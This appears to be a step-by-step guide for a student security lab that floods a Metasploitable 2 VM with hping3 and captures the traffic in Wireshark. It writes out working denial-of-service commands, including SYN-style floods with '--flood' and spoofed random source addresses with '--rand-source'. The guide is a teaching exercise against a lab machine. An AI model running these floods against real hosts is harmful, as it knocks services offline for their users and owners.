
This covers **DoS & DDoS attacks using hping3**, monitoring packets with **Wireshark**, and testing availability of **Metasploitable 2**.

---

# ✅ **WHAT YOU NEED TO DO IN THE AVAILABILITY LAB**

You will perform **3 main tasks**:

1. **Set up environment (Kali + Metasploitable 2)**
2. **Perform a DoS attack using hping3**
3. **Perform a DDoS-like attack using random source IPs**
4. **Monitor the attacks using Wireshark**

Let’s break it down step-by-step.

---

# 🔵 **PART 1 — Install hping3**

Open your Kali terminal:

```
sudo apt update
sudo apt install hping3 -y
```

If you are root user → no need for `sudo`.

---

# 🟢 **PART 2 — Setup Metasploitable 2**

1. Start **Metasploitable 2 VM**
2. Make sure it is reachable from Kali.
3. Check if the website opens:

Open browser in Kali → enter Metasploitable IP:

```
http://<victim_ip>
```

If it opens, the system is available and ready for attack simulation.

---

# 🔴 **PART 3 — Start Wireshark**

1. Open Wireshark
2. Select **any** or your network interface
3. Start capture
4. You will see packets later when you attack using hping3

---

# 🟣 **PART 4 — Perform DoS Attack (Normal Mode)**

Send slow traffic:

```
sudo hping3 -p 80 <victim_ip>
```

Example:

```
sudo hping3 -p 80 192.168.0.10
```

You will see:

* A small number of packets sent
* Wireshark will capture same packets

This is a **small, slow DoS attack**.

---

# 🟠 **PART 5 — Perform DoS Flood Attack (Fast Mode)**

Flood the server with packets:

```
sudo hping3 -p 80 <victim_ip> --flood
```

Example:

```
sudo hping3 -p 80 192.168.0.10 --flood
```

This sends **thousands or millions** of packets per minute.

In Wireshark:

* Source IP = your Kali IP (fixed)
* This represents a **DoS attack** (single attacker).

---

# 🔴 **PART 6 — Perform DDoS-like Attack Using Random IPs**

Now send packets **from random fake IP addresses** to simulate DDoS:

```
sudo hping3 -p 80 <victim_ip> --flood --rand-source
```

Example:

```
sudo hping3 -p 80 192.168.0.10 --flood --rand-source
```

In Wireshark:

* You will see **different source IPs**
* This simulates **DDoS behavior** (many attackers)

---

# 🟢 **PART 7 — Observe and Analyze in Wireshark**

Check:

* Packet flood rate
* Source IP changes
* Packet types
* TCP flags

You will clearly see the difference between:

* Normal DoS (single source)
* DDoS (random sources)

---

# 📘 **Commands You Must Use (Quick List)**

| Purpose          | Command                                        |
| ---------------- | ---------------------------------------------- |
| Install tool     | `sudo apt install hping3 -y`                   |
| Normal DoS       | `sudo hping3 -p 80 <ip>`                       |
| Fast DoS Flood   | `sudo hping3 -p 80 <ip> --flood`               |
| DDoS-like attack | `sudo hping3 -p 80 <ip> --flood --rand-source` |
| Start Wireshark  | open GUI → select interface                    |

---

# 📌 **Used Command Details (From PDF)**

* `sudo` → admin privileges
* `--flood` → sends packets as fast as possible
* `-p 80` → attack port 80 (HTTP)
* `--rand-source` → random source IP (simulates DDoS)
* `-n` → show IP instead of hostname

---

# ✅ **SUMMARY — EXACT LAB TASKS FOR YOU**

1. Install hping3
2. Start Metasploitable (victim)
3. Confirm it loads in browser
4. Start Wireshark
5. Run normal DoS
6. Run DoS flood
7. Run DDoS simulation with random IPs
8. Observe packets in Wireshark
9. Understand how availability is affected

---


